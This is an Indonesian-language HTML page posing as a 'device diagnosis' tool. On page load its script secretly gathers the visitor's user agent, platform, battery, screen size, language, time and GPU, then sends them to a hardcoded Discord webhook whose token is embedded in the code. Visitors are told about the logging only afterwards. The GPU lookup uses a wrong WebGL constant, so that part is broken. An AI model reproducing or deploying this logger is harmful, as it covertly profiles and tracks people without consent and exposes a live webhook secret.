<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Diagnosis Perangkat</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #1a1a2e; 
            color: white;
            margin: 0; 
        }
        .card { 
            background: #16213e; 
            padding: 2.5rem; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
            text-align: center;
            border: 1px solid #0f3460;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #00d2ff;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-bottom: 1rem;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { margin: 10px 0; font-weight: 300; }
        p { color: #94a3b8; }
    </style>
</head>
<body>

<div class="card" id="main-card">
    <div class="spinner"></div>
    <h2>Menganalisis Sistem...</h2>
    <p>Mohon jangan tutup halaman ini</p>
</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

    async function captureData() {
        // Ambil info baterai
        let batteryInfo = "Tidak terdeteksi";
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Mengisi Daya' : 'Baterai Biasa'})`;
            }
        } catch (e) { batteryInfo = "Akses ditolak"; }

        // Data yang dikirim ke Discord
        const payload = {
            embeds: [{
                title: "🚀 Perangkat Terdeteksi Masuk",
                color: 5814783, // Warna biru estetik
                fields: [
                    { name: "📱 User Agent (Info HP)", value: `\`\`\`${navigator.userAgent}\`\`\`` },
                    { name: "💻 Platform", value: navigator.platform, inline: true },
                    { name: "🔋 Baterai", value: batteryInfo, inline: true },
                    { name: "🖥️ Resolusi Layar", value: `${screen.width} x ${screen.height}`, inline: true },
                    { name: "🌐 Bahasa", value: navigator.language, inline: true },
                    { name: "⏰ Waktu Akses", value: new Date().toLocaleString('id-ID'), inline: true },
                    { name: "🛰️ Vendor GPU", value: getGraphicsInfo(), inline: true }
                ],
                footer: { text: "Logger Perangkat Otomatis" },
                timestamp: new Date()
            }]
        };

        // Kirim data menggunakan Fetch API
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            document.getElementById('main-card').innerHTML = `
                <h2 style="color: #4ade80;">Analisis Selesai</h2>
                <p>Spesifikasi perangkat Anda telah dicatat.</p>
            `;
        }).catch(err => {
            console.error("Gagal mengirim data.");
        });
    }

    // Fungsi tambahan untuk cek kartu grafis sederhana
    function getGraphicsInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Tidak diketahui";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
    }

    window.onload = captureData;
</script>

</body>
</html>
